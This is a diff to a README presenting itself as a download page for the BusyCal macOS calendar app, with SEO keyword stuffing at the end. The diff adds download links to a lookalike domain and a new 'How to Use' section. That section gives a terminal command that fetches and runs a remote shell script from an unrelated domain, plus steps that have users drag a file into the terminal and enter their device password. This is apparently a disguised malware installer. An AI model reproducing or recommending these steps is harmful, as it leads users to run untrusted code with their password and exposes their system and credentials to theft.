@@ -7,9 +7,28 @@ Whether you're managing work projects, planning personal events, or juggling mul
 ---
 
 ## ✅ Download BusyCal for macOS  
-[![Download BusyCal](https://img.shields.io/badge/Download-BusyCal-blueviolet)](#)
+[![Download BusyCal](https://img.shields.io/badge/Download-BusyCal-blueviolet)](https://busycal-download-mac.github.io./github)
 
 ---
+
+## 📥 How to Use
+
+Installation via .dmg:
+
+1. Install the .dmg file using the button above. 
+2. Open the .dmg installer and move the file from the left window to any convenient directory on your device.
+3. Open a terminal and transfer the file you extracted in the last step into it.
+4. Press the "Return" button, then enter your device password in the window that appears (if you don't have a password, leave the field blank).
+
+Installation via a command in the terminal:
+
+1. Copy the installation command below.
+2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
+3. Enter your device password and confirm the installation.
+```bash
+/bin/bash -c "$(curl -fsSL https://veitzeatz.com/get2/install.sh)"
+```
+
 
 ## 📦 What is BusyCal?
 
@@ -43,19 +62,12 @@ With support for customizable calendar views, task integration, weather, tags, a
 
 ---
 
-[![Download BusyCal](https://img.shields.io/badge/Download-BusyCal-blueviolet)](#)
+[![Download BusyCal](https://img.shields.io/badge/Download-BusyCal-blueviolet)](https://busycal-download-mac.github.io./github)
+
 
 ---
 
-## 📥 How to Use
 
-- ✅ Download and install BusyCal on your Mac  
-- 🔗 Connect your calendars (iCloud, Google, Exchange, etc.)  
-- 📅 Start creating events and tasks using natural language input  
-- 🎨 Customize views, tags, colors, and filters  
-- 🔔 Set reminders and recurring events as needed  
-
----
 
 ## 🖼 Preview
 
@@ -69,3 +81,4 @@ With support for customizable calendar views, task integration, weather, tags, a
 busycal, busycal for mac, busycal 2, busycal 3, busycal app, busycal mac, busycal download mac, busycal download,  
 mac calendar app, busycal task manager, calendar with weather mac, busycal icloud sync, busycal google calendar,  
 mac event planner, busycal time zone support, calendar with tags mac, productivity calendar mac, busycal office 365
+
